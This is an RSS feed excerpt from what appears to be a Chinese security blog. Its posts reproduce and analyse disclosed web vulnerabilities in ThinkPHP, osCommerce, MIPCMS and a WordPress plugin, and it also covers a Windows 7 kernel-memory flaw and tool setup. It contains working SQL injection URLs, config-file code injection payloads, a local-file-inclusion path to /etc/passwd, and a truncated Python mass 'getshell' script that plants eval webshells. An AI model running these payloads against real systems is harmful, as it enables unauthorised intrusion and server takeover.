      <link>https://getshe11.com/post/thinkphp-framework-3.2.x-sql-injection-vulnerability-analysis/</link>
      <pubDate>Wed, 18 Apr 2018 15:20:50 +0000</pubDate>
      
      <guid>https://getshe11.com/post/thinkphp-framework-3.2.x-sql-injection-vulnerability-analysis/</guid>
      <description>0x01 前言 Thinkphp 3.2.x用的也挺多的，以前的程序大部分都是用这边版本的，如果移动到2版本又挺麻烦，而且小程序不说，大程序就复杂很多了。
这次的漏洞是出现在WHERE这这个地方。
0x02 环境搭建和漏洞复现 程序下载地址：http://www.thinkphp.cn/donate/download/id/610.html PHPstudy：Apache+php7.1+MySQL 工具：PHPstorm
 首先建立一个数据库名为：thinkphp 建立一个表名为：user 添加两个字段：name,pass   thinkphp3.2版本和之前的5版本略有不同，它的数据库信息文件是在 这个文件：thinkphp/ThinkPHP/Conf/convention.php 在这里面填上我们刚才建立的数据库信息:   打开thinkphp的调试模式： 在刚才的文件：thinkphp/ThinkPHP/Conf/convention.php 然后修改为true： &#39;SHOW_ERROR_MSG&#39; =&amp;gt; true, // 显示错误信息
  这个3.2版本的控制器位置又是和5版本有点区别。具体的可以在本文的参考链接详细查看thinkphp3.2版本的开发手册。 文件位置：thinkphp/Application/Home/Controller/IndexController.class.php 在里面写一个简单的update的例子：
  &amp;lt;?php namespace Home\Controller; use Think\Controller; class IndexController extends Controller { public function index() { $tj[&amp;#39;name&amp;#39;] = I(&amp;#39;name&amp;#39;); $data[&amp;#39;pass&amp;#39;] = &amp;#39;111111&amp;#39;; $res = M(&amp;#34;user&amp;#34;)-&amp;gt;where($tj)-&amp;gt;save($data); } } I函数和5版本的input助手函数差不多，具体可以看：http://document.thinkphp.cn/manual_3_2.html#input_var
因为我们仅仅执行基本的CURD操作，所以用M方法来实例化数据库对象就行了。 实例化模型可以看：http://document.thinkphp.cn/manual_3_2.html#model_instance 7. 那么现在就开始执行我们的Payload： http://127.0.0.1/thinkphp/index.php?name[0]=bind&amp;amp;name[1]=0 and updatexml(2,concat(0x7e,user()),0)
0x03 漏洞分析  这里也是用phpstorm+debug进行动态分析，配置方法在我上一篇的5版本注入文章里面也写过了，如有不懂可以去查阅。 我们先在I函数这里下一个断点，看下I函数有没有过滤掉我们的输入。   然后访问我们payload，它会跳到入口文件，我们只要分析的是I函数执行的地方，所以我们直接F8跳到执行I函数地方： 2.</description>
    </item>
    
    <item>
      <title>再一次Hello-World，迁移博客到coding.net</title>
      <link>https://getshe11.com/post/hello-world/</link>
      <pubDate>Fri, 13 Apr 2018 09:29:23 +0000</pubDate>
      
      <guid>https://getshe11.com/post/hello-world/</guid>
      <description>原来一直在用github pages，但是访问速度有点慢，所以决定换到coding.net上面去了。
现在想在哪里写文章就在哪里写，因为用Web IDE把写好的文章放在上面，然后deploy就OK了，很Nice！
主题我用原来那个我觉得太臃肿了，博客就是用来放文章的，一个标题就好了，所以也选了一款毕竟简洁的主题，本来想自己写的，后来又想想又不是做前端的，干嘛浪费那些时间哈哈。
还有就是计划的每日一洞这个实在是坚持不了，因为每天都有其他重要的任务，而且代码审计这个并不是一两天就能审计出来的，所以我就改为每周一洞，这样子压力没那么大，也不会影响我的其他任务。</description>
    </item>
    
    <item>
      <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析(每日一洞)</title>
      <link>https://getshe11.com/post/thinkphp-framework-_-5.0.16-sql-injection-vulnerability-analysis/</link>
      <pubDate>Wed, 11 Apr 2018 09:34:29 +0000</pubDate>
      
      <guid>https://getshe11.com/post/thinkphp-framework-_-5.0.16-sql-injection-vulnerability-analysis/</guid>
      <description>0x01 前言 前天在公众号看到石大神发的一篇审计thinkphp的文章,就想写一个分析流程，delay到了今天。昨天在先知也看到了chybeta发的一篇分析文章感觉也不错。分析过程，我也会做thinkphp部分功能的解析。 废话不多说，开始吧！
0x02 环境搭建和漏洞复现 程序下载地址：http://www.thinkphp.cn/down/1126.html PHPstudy：Apache+php5.6+MySQL 工具：PHPstorm
 首先建立一个数据库名为：thinkphp 建立一个表名为：user 添加三个字段：id,name,password   在thinkphp的数据库文件填上刚才我们建立的数据库信息： 文件位置：\thinkphp\application\database.php  打开thinkphp的调试模式： 文件位置：\thinkphp\application\config.php  简单写一个update功能，石大神用到了模型，这里就简单写一个例子就行了。 文件位置：\thinkphp\application\index\controller\Index.php  &amp;lt;?php namespace app\index\controller; class Index { public function index() { $password = input(&amp;#39;get.password/a&amp;#39;); db(&amp;#39;user&amp;#39;)-&amp;gt;where([&amp;#39;id&amp;#39;=&amp;gt; 1])-&amp;gt;update([&amp;#39;password&amp;#39;=&amp;gt;$password]); } } 这里用到了thinkphp的助手函数input()，是专用来接收get，post等的值。具体可以看：https://www.kancloud.cn/manual/thinkphp5/118044 还有就是thinkphp的数据库操作，框架本身写好了我们调用就比较方便。所以为什么那么多人用框架去开发程序，快捷而且安全，不过也会有安全问题，就像今天这个sql漏洞，不过如果是新手的话总比自己写的好对吧哈。 具体可以看链接：https://www.kancloud.cn/manual/thinkphp5/135178 7. 现在就可以访问我们的payload了：
http://thinkphp.test/thinkphp/public/index.php?password[0]=inc&amp;amp;password[1]=updatexml(2,concat(0x7e,user()),0)&amp;amp;password[2]=1 0x03 漏洞分析  这里用phpstorm+debug来动态分析，有不懂配置的可以访问我写一篇配置文章：利用phpstorm+xdebug进行断点调试 我们在主函数下一断点：   然后访问我们payload，它会跳到入口文件，我们只要分析的是sql执行的地方，所以我们直接F8跳到执行sql地方： 2. 我们继续跟进到loader.php它会包含thinkphp的Db.php文件， 接下还会包\thinkphp\library\think\db\connector\Mysql.php文件，主要是连接数据库的操作，这里就直接跳过了。别分析分析把自己绕进去了，我只是在这里讲诉下过程，我们还是直接分析sql执行的部分吧。 3. 我们跳到update执行的部分，文件位置：\thinkphp\library\think\db\Query.php 继续往下看，这句是执行我们sql的地方： 4. 我们F7跟进去，跳到文件位置\thinkphp\library\think\db\Builder.php parseTable函数直接F8往下执行了，这函数是处理table分析的，主要还是parseData函数,我们继续F7跟进 5. 我们继续往下跟进 我们看到了这里如果传入的值为数组形式的话，并且第一个参数为inc就执行switch所对应的的语句。 可以看到这里函数对我们传入的值没有做任何处理，返回内容仍然是我们的语句： 跟到后面返回的执行sql语句：
执行完，我们跟进到报错的地方，说明我的语句执行成功： 6.</description>
    </item>
    
    <item>
      <title>利用phpstorm&#43;xdebug进行断点调试</title>
      <link>https://getshe11.com/post/breakpoint-debugging-with-phpstorm&#43;xdebug/</link>
      <pubDate>Tue, 10 Apr 2018 10:17:16 +0000</pubDate>
      
      <guid>https://getshe11.com/post/breakpoint-debugging-with-phpstorm&#43;xdebug/</guid>
      <description>0x01 前言 在代码审计中，有些程序用到框架之类的要想去分析一个一个看和输出调试比较麻烦，如今有了xdebug神器，就比较方便了。
0x02 配置过程 php的配置 我是用phpstudy的，所以在php目录下面都会有内置的插件：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll
如果是其他环境的话可以去官网下载相对应的版本：https://xdebug.org/download.php 然后放在ext目录下面。
然后在php.ini配置文件里面加上以下内容：
[XDebug] zend_extension=&amp;#34;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&amp;#34; xdebug.profiler_append = 0 xdebug.profiler_enable = 1 xdebug.profiler_enable_trigger = 0 xdebug.profiler_output_dir=&amp;#34;D:\phpStudy\PHPTutorial\tmp\xdebug&amp;#34; xdebug.trace_output_dir=&amp;#34;D:\phpStudy\PHPTutorial\tmp\xdebug&amp;#34; xdebug.profiler_output_name = &amp;#34;cache.out.%t-%s&amp;#34; xdebug.remote_enable = 1 xdebug.remote_handler = &amp;#34;dbgp&amp;#34; xdebug.remote_host = &amp;#34;127.0.0.1&amp;#34; xdebug.remote_port = 9000 xdebug.idekey = PHPSTORM phpstorm的设置 在phpstorm里面设置： 然后在debug的选项填上我们配置文件里面的端口： 配置proxy端口和IDE key，端口是你网站的端口，IDE key是我们配置文件里面的，应该一致： 然后配置我们的debug配置： 这里和我们网站的信息一样
下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多哈。 IDE key也要对应上我们的配置： 0x03 测试 这里我用dvwa来测试，我们先打开火狐xdebug-ext，然后打开phpstorm的debug模式，然后随便下个断点： 然后我们访问程序，已经成功断下了： </description>
    </item>
    
    <item>
      <title>由kali执行apt-get update 报错-GPG error引起数字签名的问题</title>
      <link>https://getshe11.com/post/kali-implementation-of-update-source-error-gpg-error-caused-deep-understanding-of-digital-signature/</link>
      <pubDate>Mon, 09 Apr 2018 21:00:52 +0000</pubDate>
      
      <guid>https://getshe11.com/post/kali-implementation-of-update-source-error-gpg-error-caused-deep-understanding-of-digital-signature/</guid>
      <description>0x01 前言 今天想去更新一下Kali，怎么换源都是会报错，换官方源都不行。 然后去百度了一下，参考了大神给出的方案，重新添加kali的数字签名： https://blog.csdn.net/hardhard123/article/details/79598132
wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add  但是懂得了这个解决方法，但是知其然而不知其所以然，所以我们来看下apt-key是什么？数字签名又是什么？
0x02 apt-key是什么？ Apt-get 软件包管理使用公钥加密来验证下载的软件包。
以下是从Debian的wiki页面收集的关键获取和验证过程的简短摘要。
 基本概念公钥密码系统基于成对的密钥a public key和a private key。这public key是给世界的; 在private key必须保持秘密。拥有公钥的任何人都可以对消息进行加密，以便只有持有私钥的人才能阅读。也可以使用私钥签名文件，而不是对其进行加密。如果使用私钥签名文件，那么拥有公钥的任何人都可以检查该文件是否由该密钥签名。任何没有私钥的人都可以伪造这样的签名。 gpg（GNU Privacy Guard）是安全易用的签名文件并检查签名的工具。 apt-key是一个用于管理安全apt的gpg密钥环的程序。钥匙圈保存在文件中/etc/apt/trusted.gpg （不要与相关但不很混淆 /etc/apt/trustdb.gpg）。apt-key可用于显示密钥环中的密钥，以及添加或删除密钥。
 每次添加另一个apt存储库时/etc/apt/sources.list，如果您想要信任它，还必须给出它的关键字。获得密钥后，您可以通过检查密钥的指纹并使用私钥签署该公钥来验证密钥。然后，您可以将密钥添加到apt的密钥环中apt-key add 您需要存储库密钥，以便您可以验证您是否从您认为自己获得的软件包中获得了该软件包。
这就是为了防止人们将不好的软件包注入到更新中。
0x03 数字签名是什么？ 大神阮一峰一篇翻译的文章里面说的很清晰透彻，作者是David Youd:
1.鲍勃有两把钥匙，一把是公钥，另一把是私钥。 2.鲍勃把公钥送给他的朋友们&amp;mdash;-帕蒂、道格、苏珊&amp;mdash;-每人一把。 3.苏珊要给鲍勃写一封保密的信。她写完后用鲍勃的公钥加密，就可以达到保密的效果。 4.鲍勃收信后，用私钥解密，就看到了信件内容。这里要强调的是，只要鲍勃的私钥不泄露，这封信就是安全的，即使落在别人手里，也无法解密。 5.鲍勃给苏珊回信，决定采用&amp;quot;数字签名&amp;quot;。他写完后先用Hash函数，生成信件的摘要（digest）。 6.然后，鲍勃使用私钥，对这个摘要加密，生成&amp;quot;数字签名&amp;quot;（signature）。 7.鲍勃将这个签名，附在信件下面，一起发给苏珊。 8.苏珊收信后，取下数字签名，用鲍勃的公钥解密，得到信件的摘要。由此证明，这封信确实是鲍勃发出的。 9.苏珊再对信件本身使用Hash函数，将得到的结果，与上一步得到的摘要进行对比。如果两者一致，就证明这封信未被修改过。 0x04 公钥和私钥加密解密？ 看完上面可能还是会有点懵，到底是谁加密谁，谁解密谁？
知乎最好的答案： 你只要想：既然是加密，那肯定是不希望别人知道我的消息，所以只有我才能解密，所以可得出公钥负责加密，私钥负责解密；同理，既然是签名，那肯定是不希望有人冒充我发消息，只有我才能发布这个签名，所以可得出私钥负责签名，公钥负责验证。
0x05参考 https://www.zhihu.com/question/25912483/answer/46649199
http://www.youdzone.com/signature.html
http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html</description>
    </item>
    
    <item>
      <title>从用CentOS安装Docker靶场到Joomla 3.4.5 反序列化漏洞复现(每日一洞)</title>
      <link>https://getshe11.com/post/install-docker-from-centos-to-build-loopholes-to-joomla-3.4.5-replay-of-deserialization-loopholes/</link>
      <pubDate>Sat, 07 Apr 2018 09:02:12 +0000</pubDate>
      
      <guid>https://getshe11.com/post/install-docker-from-centos-to-build-loopholes-to-joomla-3.4.5-replay-of-deserialization-loopholes/</guid>
      <description>0x01 前言 最近天气突然变凉，导致我直接病倒在床，今天才缓过来。
上次的用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)讲的是Windows搭建，这次就以CentOS作为Dokcer的环境去搭建漏洞靶场，并以Joomla 3.4.5 反序列化漏洞复现(CVE-2015-8562)作为演示。
我本来还想写这个漏洞的分析，但是对于Joomla的比较大的程序，函数又多，要写一篇简单易懂的文章，篇幅会很长、很枯燥，我觉得还是不要造轮子了，直接去看P神的文章就行了Joomla远程代码执行漏洞分析（总结）。
话有点多了，估计是还没吃药哈。
0x02 安装Docker过程 1.安装所需的包 $ sudo yum install -y yum-utils \ device-mapper-persistent-data \ lvm2 2.添加Docker的源 $ sudo yum-config-manager \ --add-repo \ https://download.docker.com/linux/centos/docker-ce.repo 3.启用边缘和测试存储库 $ sudo yum-config-manager --enable docker-ce-edge $ sudo yum-config-manager --enable docker-ce-test  4.安装Docker $ sudo yum install docker-ce  5.验证是否正确安装 $ docker -v  6.使用国内的Docker加速器 不用加速器慢到要死，推荐使用。 注册一个阿里云的账号：https://cr.console.aliyun.com/#/accelerator
然后获取专属加速器地址： 输入以下命令：
sudo tee /etc/docker/daemon.json &amp;lt;&amp;lt;-&amp;#39;EOF&amp;#39; { &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://你的地址.mirror.aliyuncs.com&amp;#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker 7.</description>
    </item>
    
    <item>
      <title>osCommerce 2.3.4.1 - 远程代码执行漏洞（每日一洞）</title>
      <link>https://getshe11.com/post/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</link>
      <pubDate>Mon, 02 Apr 2018 11:18:58 +0000</pubDate>
      
      <guid>https://getshe11.com/post/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</guid>
      <description>0x01 前言 好几天没有写了，前两天又去Boom了，差点没缓过来。今天在exploit-db逛看到一个洞，也是install的地方，想去利用上次那个远程数据库技巧来尝试下，发现这个洞根本用不到，不过新手可以学习下哈，也可以收藏下，因为有时候在ctf线下赛的时候官方会拿一些国外的程序给你玩，最近也在写python的漏洞利用工具，欢迎关注我的github。
0x02 环境 程序源码下载：https://www.exploit-db.com/apps/ce2796b352d6e0fb4e9f03866ae98541-oscommerce-2.3.4.zip Web环境:Windows 10+Apache2+PHP5.6+MySQL
0x03 漏洞利用过程 1.我们先正常安装这个程序 2.执行我们的payload GET:http://127.0.0.1/oscommerce/install/install.php?step=4 POST:DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&amp;#39;);phpinfo();/* 3.访问写入代码的文件 GET:http://127.0.0.1/oscommerce/install/includes/configure.php  写入的内容： 0x04 漏洞代码分析过程 漏洞文件出现的位置是：\install\templates\pages\install_4.php
说起这个国外写的程序还没我们国内的严谨，安装完没有写入install.lock或者像Joomla（最近正在写）一样强制让客户删除安装文件。
直接看代码吧，过程也不算太复杂。这里用到了PHP以下的函数$HTTP_POST_VARS这个函数类似与PHP4及以上的$_POST。这里是接收参数的地方。 最重要还是这里，因为如果没有传入DIR_FS_DOCUMENT_ROOT的话下面写入文件就无法进行了。
0x05 Payload构造 DIR_FS_DOCUMENT_ROOT是必须的了，让它等于根目录./就行了。 写入恶意代码就用DB_DATABASE吧，我们先用闭合&#39;);前面，然后再写入phpinfo();,后面它会自动加上&#39;);，exploit-db上面是直接加上/*注释掉的，因为这个程序很奇怪，先一遍在install的配置文件，然后再写到程序里面的配置文件，所以就不会顾虑网站会崩的问题了。 payload： post 模式DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&#39;);phpinfo();/*
0x06 用Python编写批量getshell脚本 我觉得你们应该读得懂这个代码吧，如果有需要的话我以后会把这里面的流程解释一遍。
#!/usr/bin/env #author:F0rmat import sys import requests import threading def exploit(target): if sys.argv[1]== &amp;#34;-f&amp;#34;: target=target[0] url1=target+&amp;#34;/install/install.php?step=4&amp;#34; data={ &amp;#39;DIR_FS_DOCUMENT_ROOT&amp;#39;: &amp;#39;./&amp;#39;, &amp;#39;DB_DATABASE&amp;#39;:&amp;#34;\&amp;#39;);@eval($_POST[&amp;#39;f0rmat&amp;#39;]);echo &amp;#39;F0rmat&amp;#39;;/*&amp;#34; } url2=target+&amp;#34;install/includes/configure.php&amp;#34; try: requests.post(url1,data=data) verify = requests.get(url2, timeout=3) if &amp;#34;F0rmat&amp;#34; in verify.content: print &amp;#39;Write success,shell url:&amp;#39;,url2,&amp;#39;pass:f0rmat&amp;#39; with open(&amp;#34;success.</description>
    </item>
    
    <item>
      <title>漏洞预警|Windows 7 Meltdown 补丁发现漏洞，允许任意进程读写内核</title>
      <link>https://getshe11.com/post/vulnerability-alert_windows-7-meltdown-patch-discovery-vulnerability-allows-any-process-to-read-and-write-kernels/</link>
      <pubDate>Thu, 29 Mar 2018 10:16:39 +0000</pubDate>
      
      <guid>https://getshe11.com/post/vulnerability-alert_windows-7-meltdown-patch-discovery-vulnerability-allows-any-process-to-read-and-write-kernels/</guid>
      <description>前言 今晚本来想养生睡个早觉的，睡前浏览了下twitter，看到大佬的高危漏洞，看着有点好笑，微软拿起自己的石头砸自己的脚操作哈哈，这个洞在27号就已经出来了。  今年1月份英特尔确认了在自家CPU中发现两个安全漏洞，而这些漏洞将会使得数十亿设备面临受到攻击的风险“Meltdown”和“Spectre”两个漏洞让不少人感觉恐慌，因为他们发现这些漏洞几乎影响到过去20年制造的每一种计算设备，无论是手机还是个人电脑。他们允许恶意程序窃取在受影响机器上处理的敏感数据。
 别以为安装这个官方的补丁就很安全了，更糟糕的事情来了，这个漏洞可以允许任意进程读写内核。
总体崩溃? 你认为Meltdown糟糕吗？未授权的应用程序能够以每秒兆字节的速度读取内核内存不是一件好事。
从1月份开始迎接Windows 7 Meltdown补丁。它停止了Meltdown，但是开辟了一条更糟的漏洞&amp;hellip;&amp;hellip;它允许任何进程以每秒千兆字节的速度读取完整的内存内容，噢 - 也可以写入任意内存。
没有fancy的利用需要。 Windows 7已经将所需内存映射到每个正在运行的进程中。开发仅仅是读写已映射进程内虚拟内存的问题。没有fancy的API或系统调用要求 - 只是标准的读取和写入！ 由于磁盘传输速度的原因，以超过4GB / s的速度访问内存，转储到磁盘的速度较慢
这怎么可能？ 简而言之 - 在PML4自引用条目中，User/Supervisor权限位已设置为User。这使得页表在每个进程中都可用于用户模式代码。页面表通常只能由内核本身访问。
PML4是4级内存页表层次结构的基础，CPU内存管理单元（MMU）用来将进程的虚拟地址转换为RAM中的物理内存地址。欲了解更多有关寻呼的深入信息，请看看获得物理：极端滥用基于英特尔的寻呼系统 - 第1部分和第2部分。 位于偏移量0xF68且值为0x0000000062100867的PML4自引用条目。
Windows在这个最重要的PML4页表中有一个特殊的条目，它引用了它自己的一个自引用条目。在Windows 7中，PML4自引用固定在位置0x1ED，偏移量0xF68（在Windows 10中随机化）。这意味着PML4将始终映射到虚拟内存中的地址0xFFFFF6FB7DBED000。这通常是一个内核地址（Supervisor）提供的内存地址。由于权限位被错误地设置为用户，这意味着PML4被映射到每个进程并且可用于在用户模式下执行的代码。
作为用户模式读/写页面映射到每个进程的“内核地址”内存地址。.
一旦对页表进行读/写访问，除非通过用于虚拟化的扩展页表（EPT）进行额外保护，否则访问整个物理内存将非常容易。所有人都必须将自己的页面表项（PTE）写入页表以访问任意的物理内存。
PML4e 0x0000000062100867中的最后一个&#39;7&#39;（来自上面的例子）表示位0,1,2被设置，这意味着它可以按照Intel手册中的说明进行存在，可写和用户模式访问。 摘自英特尔手册，如果位2设置为&#39;1&#39;，则允许用户模式访问。
我可以自己尝试一下吗？ 是的，一点没错。 该技术已被添加为PCILeech直接存储器访问攻击工具包的内存采集设备。 只需下载PCILeech并使用设备类型执行即可：-device totalmeltdown在易受攻击的Windows 7系统上。
使用以下命令将内存转储到文件：
pcileech.exe dump -out memorydump.raw -device totalmeltdown -v -force 如果安装了Dokany文件系统驱动程序，则应该能够将正在运行的进程挂载为内存进程文件系统中的文件和文件夹 - 将内核的虚拟内存和进程的内存作为读/写进行安装。
要挂载进程，请执行以下命令：
pcileech.exe mount -device totalmeltdown 如果您暂时卸载最新版本以测试此漏洞，请记住重新安装安全更新。
易受攻击的系统被“利用”，运行中的进程被PCILeech挂载。进程内存映射和PML4被访问。
我的系统很脆弱吗？ 只有使用2018-01或2018-02补丁修补的Windows 7 x64系统才容易受到攻击。如果您的系统自2017年12月以来没有进行过修补，或者修补了2018-03修补程序或更高版本，那么它将是安全的。
其他Windows版本 - 例如Windows 10或8.1，对于这个问题是完全安全的，并且从未受到它的影响。</description>
    </item>
    
    <item>
      <title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</title>
      <link>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</link>
      <pubDate>Mon, 26 Mar 2018 01:09:26 +0000</pubDate>
      
      <guid>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</guid>
      <description>0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&amp;#39;,1=&amp;gt;eval(file_get_contents(&amp;#39;php://input&amp;#39;)),&amp;#39;2&amp;#39;=&amp;gt;&amp;#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&amp;quot;#{$key}#&amp;quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&amp;#39;Access-Control-Allow-Origin: *&amp;#39;); header(&amp;#39;Access-Control-Allow-Credentials: true&amp;#39;); header(&amp;#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&amp;#39;); header(&amp;#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&amp;#39;); if (Request::instance()-&amp;gt;isPost()) {//判断是否有post的数据  $dbconfig[&amp;#39;type&amp;#39;]=&amp;#34;mysql&amp;#34;;//定义数据库类型  $dbconfig[&amp;#39;hostname&amp;#39;]=input(&amp;#39;post.</description>
    </item>
    
    <item>
      <title>Wordpress Plugin Site Editor 1.1.1 - 本地文件包含漏洞分析(每日一洞)</title>
      <link>https://getshe11.com/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</link>
      <pubDate>Sun, 25 Mar 2018 13:45:14 +0000</pubDate>
      
      <guid>https://getshe11.com/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</guid>
      <description>0x01 前言 大概有一周没有写文章了，比赛完嗨皮了两天，喝酒喝到半夜回来继续看文章，看到了exploit的关于wordpress一个漏洞信息CVE-2018-7422 ，下面就来分析一下这个本地文件包含的漏洞代码，如果权限够的话是可以读取系统的一些敏感的文件例如:/etc/passwd、/etc/shadow等。
0x02 漏洞复现 环境 攻击机：Deepin Linux x64 Wordpress服务器：Windows 10 x64 (phpstudy) 搭建环境有些要注意的，例如上传插件是大于2M的，要php.ini里面修改下再重启下就行了。 Proof of Concept http://&amp;lt;host&amp;gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=要读取的文件绝对路径或者相对路径 结果 0x03 代码分析 文件在wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php 
你可以去插件的官方github看，前天的漏洞，现在还没修复 https://github.com/SiteEditor/editor/blob/master/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
这个漏洞代码比较简单容易，新手也很适合理解。 整合代码执行流程就是判断文件是否存在，存在就require_once包含，不存在就报错。 这里有一个点，为什么说是只能本地文件包含呢，不能用远程包含吗？如果远程文件包含不就可以利用php的协议来getshell了吗？ 因为file_exists函数只能判断本地文件，如果是远程文件的话就会判断文件不存在了。
if( isset( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) &amp;amp;&amp;amp; is_file( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) &amp;amp;&amp;amp; file_exists( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) ){ require_once $_REQUEST[&amp;#39;ajax_path&amp;#39;]; }else{ echo json_encode( array( &amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#34;Error: didn&amp;#39;t load shortcodes pattern file&amp;#34;, ) ); return ; } 0x04 结束 再给我点时间，嗨皮过头了还没缓过神来，看过大表哥对我文章的评价，我会改进文章的一些细节，展现更好的给大家。
0x05 参考 插件源码下载：https://pan.</description>
    </item>
    
    <item>
      <title>Deepin Linux install Metasploit</title>
      <link>https://getshe11.com/post/deepin-linux-install-metasploit/</link>
      <pubDate>Sat, 24 Mar 2018 12:46:22 +0000</pubDate>
      
      <guid>https://getshe11.com/post/deepin-linux-install-metasploit/</guid>
      <description>前言 最近换了个系统，觉得国内的Deepin Linux还是比较符合日常适合和编程的。之前用ThinkPad装Ubuntu都崩好几次了，比较笔记本性能不太好。
环境 笔记本：ThinkPad X230 下载安装 官网上面有安装指导，以前那种安装方法特别麻烦，安装完msf还要自己去下载数据库配置用户连接信息，现在就比较方便了哈。
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
切换到root用户然后执行下面的命令就ok了。
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \ chmod 755 msfinstall &amp;amp;&amp;amp; \ ./msfinstall 安装过程： 建立数据库 我在root用户下面不能自动帮我创建数据库，然后我切换到用户目录下就ok了。 结束 今天要继续写我的每日一洞了，上周一直都在做赛前准备，所以就没有继续写下去，我不会放弃的，既然要做一件事情，就要坚定的做下去。
参考 https://www.metasploit.com/</description>
    </item>
    
    <item>
      <title>用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)</title>
      <link>https://getshe11.com/post/use-docker-to-build-a-variety-of-loopholes-my-mother-no-longer-has-to-worry-about-not-having-practiced-in-the-shooting-range/</link>
      <pubDate>Wed, 14 Mar 2018 16:49:17 +0000</pubDate>
      
      <guid>https://getshe11.com/post/use-docker-to-build-a-variety-of-loopholes-my-mother-no-longer-has-to-worry-about-not-having-practiced-in-the-shooting-range/</guid>
      <description>1. 前言 最近练习也在搭建这个漏洞环境，但是很费时间，然后就想到用Docker搭建比较快，又方便。不多废话，直接开始吧！
2. 下载Docker 我本次是利用Windows 10 来安装Docker，因为Windows出现了一个问题需要解决下，Linux和Mac安装官网的安装方法基本没什么问题。
官方下载地址：https://docs.docker.com/docker-for-windows/install/ 安装／升级你的Docker客户端 对于Windows 10以下的用户 推荐使用 Docker Toolbox Toolbox的介绍和帮助：mirrors.aliyun.com/help/docker-toolbox
Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/
对于Windows 10以上的用户 推荐使用 Docker for Windows Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-for-windows/
3. 安装Docker   运行安装文件：   安装完成：   安装完之后会出现一个问题，就是要你开win10里面的Hyper-V，这个功能和VMware是冲突的，所以你开了Hyper-V就不能用VMware了
